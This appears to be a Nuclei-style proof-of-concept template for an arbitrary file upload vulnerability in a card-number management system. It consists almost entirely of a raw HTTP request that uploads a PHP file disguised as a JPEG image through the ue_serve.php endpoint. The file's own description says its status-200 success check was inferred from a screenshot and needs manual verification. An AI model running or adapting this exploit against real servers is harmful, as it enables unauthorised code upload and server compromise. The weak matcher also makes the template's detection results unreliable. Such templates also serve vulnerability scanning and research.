id: poc-96153d426cb7e5141c6c
info:
  name: 卡号极团管理系统ue_serve存在任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
http:
- raw:
  - 'POST /admin/controller/ue_serve.php?action=image&encode=utf-8 HTTP/2

    Host: {{Hostname}}

    Cookie: PHPSESSID=ecq4ucplk5n6e3ipihvktl103r

    Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"

    Sec-Ch-Ua-Platform: "Windows"

    Sec-Ch-Ua-Mobile: ?0

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylkv1kpsZgzw2WC03

    Accept: */*

    Sec-Fetch-Site: same-origin

    Sec-Fetch-Mode: cors

    Sec-Fetch-Dest: empty

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    Content-Length: 301


    ------WebKitFormBoundarylkv1kpsZgzw2WC03

    Content-Disposition: form-data; name="name"


    raw.php

    ------WebKitFormBoundarylkv1kpsZgzw2WC03

    Content-Disposition: form-data; name="upfile"; filename="raw.php"

    Content-Type: image/jpeg


    <?php phpinfo();?>

    ------WebKitFormBoundarylkv1kpsZgzw2WC03--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
